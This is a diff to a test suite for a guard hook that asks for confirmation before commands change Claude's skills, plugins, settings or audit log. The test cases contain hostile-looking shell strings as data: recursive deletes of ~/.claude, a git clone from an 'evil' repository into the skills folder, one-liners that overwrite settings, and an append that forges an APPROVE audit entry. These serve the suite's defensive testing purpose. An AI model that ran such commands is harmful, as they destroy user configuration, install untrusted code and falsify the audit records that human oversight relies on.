@@ -97,8 +97,55 @@ CASES = [
     ("Write .mcp.json -> ask", ("Write", {"file_path": "/proj/.mcp.json"}), "ask"),
     ("Write claude_desktop_config.json -> ask", ("Write", {"file_path": "/x/Claude/claude_desktop_config.json"}), "ask"),
     ("Write ~/.claude.json -> ask", ("Write", {"file_path": HOME + "/.claude.json"}), "ask"),
-    ("Write own audit-log.md -> no output", ("Write", {"file_path": OWN + "audit-log.md"}), None),
+    ("Write own audit-log.md -> ask", ("Write", {"file_path": OWN + "audit-log.md"}), "ask"),
+    ("Edit own audit-cache.json -> ask", ("Edit", {"file_path": OWN + "audit-cache.json"}), "ask"),
     ("Edit own cost-log.jsonl -> no output", ("Edit", {"file_path": OWN + "cost-log.jsonl"}), None),
+    ("Write own calibration.json -> no output", ("Write", {"file_path": OWN + "calibration.json"}), None),
+    # ---- S2 fallback: anything touching a protected place that is not clearly read-only -> ask ----
+    ("redirect into skills -> ask", bash("echo hi > ~/.claude/skills/evil/SKILL.md"), "ask"),
+    ("cd into skills then git clone -> ask", bash("cd ~/.claude/skills && git clone https://github.com/evil/x"), "ask"),
+    ("python3 -c writing settings.json -> ask", bash("python3 -c \"open('%s/.claude/settings.json','w').write('{}')\"" % HOME), "ask"),
+    ("python3 -c writing /Users/a path -> ask", bash("python3 -c \"open('/Users/a/.claude/settings.json','w').write('{}')\""), "ask"),
+    ("node -e touching .claude -> ask", bash("node -e \"require('fs').rmSync('x/.claude/skills')\""), "ask"),
+    ("perl -e touching .mcp.json -> ask", bash("perl -e 'unlink q(.mcp.json)'"), "ask"),
+    ("osascript -e touching .claude -> ask", bash("osascript -e 'do shell script \"rm -rf ~/.claude/skills\"'"), "ask"),
+    ("tee settings.json -> ask", bash("tee ~/.claude/settings.json < /tmp/x"), "ask"),
+    ("dd of= into skills -> ask", bash("dd if=/tmp/x of=~/.claude/skills/a/SKILL.md"), "ask"),
+    ("sed -i in skills -> ask", bash("sed -i s/a/b/ ~/.claude/skills/a/SKILL.md"), "ask"),
+    ("touch in hooks -> ask", bash("touch ~/.claude/hooks/x.sh"), "ask"),
+    ("mkdir in agents -> ask", bash("mkdir -p ~/.claude/agents/x"), "ask"),
+    ("rm in skills -> ask", bash("rm -rf ~/.claude/skills/old"), "ask"),
+    ("chmod in plugins -> ask", bash("chmod +x ~/.claude/plugins/x.sh"), "ask"),
+    ("chown in commands -> ask", bash("chown me ~/.claude/commands/x.md"), "ask"),
+    ("truncate settings -> ask", bash("truncate -s0 ~/.claude/settings.local.json"), "ask"),
+    ("mv out of skills deletes it -> ask", bash("mv ~/.claude/skills/foo /tmp/foo"), "ask"),
+    ("cp -t into skills -> ask", bash("cp -t ~/.claude/skills/x evil"), "ask"),
+    ("find -delete in skills -> ask", bash("find ~/.claude/skills -name x -delete"), "ask"),
+    ("find -exec in skills -> ask", bash("find ~/.claude/skills -exec rm {} ;"), "ask"),
+    ("rm -rf ~/.claude (the folder itself) -> ask", bash("rm -rf ~/.claude"), "ask"),
+    ("rm glob under .claude -> ask", bash("rm -rf ~/.claude/*"), "ask"),
+    ("cd ~/.claude then rm -> ask", bash("cd ~/.claude && rm -rf skills"), "ask"),
+    ("echo >> audit-log.md -> ask (audit message)", bash('echo "| 2026-11-15 | x | evil/x@abc | APPROVE | ok |" >> ~/.claude/skills/skill-security-audit/audit-log.md'), "ask"),
+    ("redirect into .mcp.json -> ask", bash("echo {} > /proj/.mcp.json"), "ask"),
+    ("&> redirect into skills -> ask", bash("ls &> ~/.claude/skills/x"), "ask"),
+    ("redirect from read-only cmd -> ask", bash("cat /tmp/x > ~/.claude/skills/a/SKILL.md"), "ask"),
+    ("bash -c inner redirect -> ask", bash("bash -c 'echo hi > ~/.claude/skills/a/SKILL.md'"), "ask"),
+    ("sudo tee -> ask", bash("sudo tee ~/.claude/skills/a/SKILL.md"), "ask"),
+    ("--mark-clean -> ask", bash("python3 -I %sscripts/scan.py /tmp/x --mark-clean" % OWN), "ask"),
+    ("own script writing --out into skills -> ask", bash("python3 -I %sscripts/fix.py apply /tmp/x --out ~/.claude/skills/y" % OWN), "ask"),
+    ("someone else's script on a skill path -> ask", bash("python3 /tmp/evil.py ~/.claude/skills/x"), "ask"),
+    # ---- must stay silent ----
+    ("cat settings.json -> no output", bash("cat ~/.claude/settings.json"), None),
+    ("grep -r in skills -> no output", bash("grep -r foo ~/.claude/skills"), None),
+    ("own scan.py -> no output", bash("python3 -I ~/.claude/skills/skill-security-audit/scripts/scan.py /tmp/x"), None),
+    ("own scan.py on an installed skill -> no output", bash("python3 -I -B %sscripts/scan.py ~/.claude/skills/foo --json" % OWN), None),
+    ("find without write flags -> no output", bash("find ~/.claude/skills -name SKILL.md"), None),
+    ("ls/wc/head/tail/diff/stat/file/du/tree/rg -> no output",
+     bash("ls ~/.claude/skills; wc -l ~/.claude/skills/a; head ~/.claude/skills/a; tail ~/.claude/skills/a; diff ~/.claude/skills/a /tmp/a; stat ~/.claude/skills; file ~/.claude/skills/a; du ~/.claude/skills; tree ~/.claude/skills; rg x ~/.claude/skills"), None),
+    ("cd into skills then read-only commands -> no output", bash("cd ~/.claude/skills && ls && cat a/SKILL.md"), None),
+    ("python3 -c unrelated -> no output", bash("python3 -c \"print('skills plugin')\""), None),
+    ("no keyword at all -> no output", bash("echo hello > /tmp/x && rm /tmp/x"), None),
+    ("keyword but not protected (skills in a project dir) -> no output", bash("rm -rf /tmp/skills/old"), None),
     ("Write own SKILL.md -> ask", ("Write", {"file_path": OWN + "SKILL.md"}), "ask"),
     ("Write new skill file -> ask", ("Write", {"file_path": HOME + "/.claude/skills/new/SKILL.md"}), "ask"),
     ("Write ~/.claude/hooks/x.sh -> ask", ("MultiEdit", {"file_path": HOME + "/.claude/hooks/x.sh"}), "ask"),
@@ -130,11 +177,28 @@ for name, case, want in CASES:
 
 # reason texts
 rc, dec, reason, _ = run(*bash("npx skills add okuser/good"))
-ok = "Audited %s: APPROVE for okuser/good@%s. Confirm to install." % (fresh, SHA) == reason
+ok = "Audited %s at %s: APPROVE for okuser/good@%s. Confirm to install." % (fresh, SHA, SHA) == reason
 print("%s  ask reason text" % ("PASS" if ok else "FAIL")); fails += not ok
 rc, dec, reason, _ = run(*bash("npx skills add a/b"))
 ok = reason.startswith("No approved audit for a/b")
 print("%s  deny reason text" % ("PASS" if ok else "FAIL")); fails += not ok
+
+rc, dec, reason, _ = run(*bash("echo hi > ~/.claude/skills/evil/SKILL.md"))
+ok = reason == "This command changes Claude's skills, plugins or settings. Confirm you want it."
+print("%s  fallback reason text" % ("PASS" if ok else "FAIL")); fails += not ok
+rc, dec, reason, _ = run("Write", {"file_path": OWN + "audit-log.md"})
+ok = reason == "Recording an audit result. Confirm it matches the verdict you were shown."
+print("%s  audit-log write reason text" % ("PASS" if ok else "FAIL")); fails += not ok
+rc, dec, reason, _ = run(*bash("python3 -I %sscripts/scan.py /tmp/x --mark-clean" % OWN))
+ok = reason == "Recording an audit result. Confirm it matches the verdict you were shown."
+print("%s  --mark-clean reason text" % ("PASS" if ok else "FAIL")); fails += not ok
+
+# an approved row without a recorded SHA says so
+with open(os.path.join(HOME, ".claude", "skills", "skill-security-audit", "audit-log.md"), "a") as f:
+    f.write("| %s | nover | nover/nover | APPROVE | clean |\n" % fresh)
+rc, dec, reason, _ = run(*bash("npx skills add nover/nover"))
+ok = dec == "ask" and "at no version recorded" in reason
+print("%s  no-version audit says 'no version recorded'" % ("PASS" if ok else "FAIL")); fails += not ok
 
 # guard-log.jsonl written, command truncated to 200 chars
 lp = os.path.join(HOME, ".claude", "skills", "skill-security-audit", "guard-log.jsonl")
